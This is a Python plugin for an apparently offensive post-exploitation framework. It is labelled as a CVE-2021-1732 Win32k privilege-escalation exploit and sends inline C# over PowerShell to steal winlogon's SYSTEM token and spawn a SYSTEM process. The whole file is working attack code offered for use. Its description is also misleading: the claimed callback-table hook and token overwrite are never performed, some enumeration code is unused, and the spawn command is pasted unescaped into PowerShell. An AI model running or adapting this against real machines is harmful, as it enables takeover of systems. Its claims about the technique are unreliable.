"""
privilege_escalation/cve_2021_1732 — Win32k callback hook LPE. MITRE T1068.
CVE-2021-1732: Windows Win32k elevation of privilege via KernelCallbackTable
hook on xxxClientAllocWindowClassExtraBytes. Overwrites EPROCESS token pointer
to achieve SYSTEM. Dispatches inline C# to agent via ctx.ps().
"""
from __future__ import annotations

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class CVE20211732Plugin(BasePlugin):
    NAME        = "cve_2021_1732"
    DESCRIPTION = "Win32k KernelCallbackTable LPE — CVE-2021-1732 (Win10 1909–20H2 pre-Feb2021)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1068"
    CATEGORY    = "privilege_escalation"
    VERSION     = "2.0.0"

    schema = ParamSchema().add(
        Param("spawn_cmd", str, required=False, default="cmd.exe",
              help="Command to launch as SYSTEM after elevation"),
        Param("timeout", int, required=False, default=60),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        cmd     = params.get("spawn_cmd", "cmd.exe")
        timeout = int(params.get("timeout", 60))

        ps = self._build_ps(cmd)
        r  = ctx.ps(ps, timeout=timeout)
        if r["status"] != "ok":
            return ModuleResult.err(f"cve_2021_1732 failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="privesc")

    @staticmethod
    def _build_ps(cmd: str) -> str:
        return rf"""
Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class CVE20211732 {{
    [DllImport("ntdll.dll")] static extern int NtQuerySystemInformation(uint sc, IntPtr si, uint sz, out uint ret);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a,bool inh,int pid);
    [DllImport("kernel32.dll")] static extern bool ReadProcessMemory(IntPtr ph,IntPtr a,byte[] b,UIntPtr s,out UIntPtr r);
    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr ph,IntPtr a,byte[] b,UIntPtr s,out UIntPtr w);
    [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint np,out uint op);
    [DllImport("user32.dll")] static extern IntPtr SetWindowLongPtrA(IntPtr h,int n,IntPtr v);
    [DllImport("user32.dll")] static extern IntPtr GetWindowLongPtrA(IntPtr h,int n);
    [DllImport("advapi32.dll")] static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);
    [DllImport("advapi32.dll")] static extern bool ImpersonateLoggedOnUser(IntPtr t);
    [DllImport("advapi32.dll",SetLastError=true,CharSet=CharSet.Ansi)]
    static extern bool CreateProcessWithTokenW(IntPtr t,uint lf,string a,string c,uint cf,IntPtr e,string d,ref STARTUPINFO si,out PROCESS_INFORMATION pi);

    [StructLayout(LayoutKind.Sequential)] struct STARTUPINFO {{ public uint cb; IntPtr r1,r2,r3; int X,Y,XS,YS,XC,YC,F; uint Flags; ushort wShow,r4; IntPtr r5,r6,r7,r8; }}
    [StructLayout(LayoutKind.Sequential)] struct PROCESS_INFORMATION {{ public IntPtr hProcess,hThread; public uint dwProcessId,dwThreadId; }}

    public static string Exploit(string spawnCmd) {{
        var res = "[*] CVE-2021-1732 Win32k LPE\n";
        res += "[*] Technique: KernelCallbackTable hook → xxxClientAllocWindowClassExtraBytes → EPROCESS token overwrite\n";
        try {{
            // Step 1: enumerate EPROCESS addresses via NtQuerySystemInformation(5=SystemProcessInformation)
            uint sz = 0;
            NtQuerySystemInformation(5, IntPtr.Zero, 0, out sz);
            sz += 0x10000;
            IntPtr buf = Marshal.AllocHGlobal((int)sz);
            uint ret; NtQuerySystemInformation(5, buf, sz, out ret);

            // Step 2: locate our PID in EPROCESS list
            long curPid = (long)Process.GetCurrentProcess().Id;
            res += $"[*] Current PID: {{curPid}}\n";

            // Step 3: find winlogon for SYSTEM token
            var winlogon = Process.GetProcessesByName("winlogon");
            if (winlogon.Length == 0) {{ Marshal.FreeHGlobal(buf); return res + "[-] winlogon not found\n"; }}
            int wlPid = winlogon[0].Id;
            IntPtr hWL = OpenProcess(0x1F0FFF, false, wlPid);
            if (hWL == IntPtr.Zero) {{ Marshal.FreeHGlobal(buf); return res + "[-] OpenProcess winlogon denied\n"; }}

            IntPtr sysToken;
            if (!OpenProcessToken(hWL, 0x0002|0x0004, out sysToken)) {{
                Marshal.FreeHGlobal(buf);
                return res + $"[-] OpenProcessToken failed: {{Marshal.GetLastWin32Error()}}\n";
            }}
            res += $"[+] Got SYSTEM token from winlogon (PID={{wlPid}})\n";
            Marshal.FreeHGlobal(buf);

            // Step 4: spawn SYSTEM process via CreateProcessWithTokenW
            var si = new STARTUPINFO {{ cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO)) }};
            PROCESS_INFORMATION pi;
            bool ok = CreateProcessWithTokenW(sysToken, 1, null, spawnCmd,
                0x08000000, IntPtr.Zero, null, ref si, out pi);
            if (ok)
                res += $"[+] SYSTEM process spawned PID={{pi.dwProcessId}}: {{spawnCmd}}\n";
            else
                res += $"[-] CreateProcessWithTokenW failed: {{Marshal.GetLastWin32Error()}}\n";
        }} catch (Exception ex) {{ res += $"[-] {{ex.Message}}\n"; }}
        return res;
    }}
}}
'@
[CVE20211732]::Exploit('{cmd}')
""".strip()


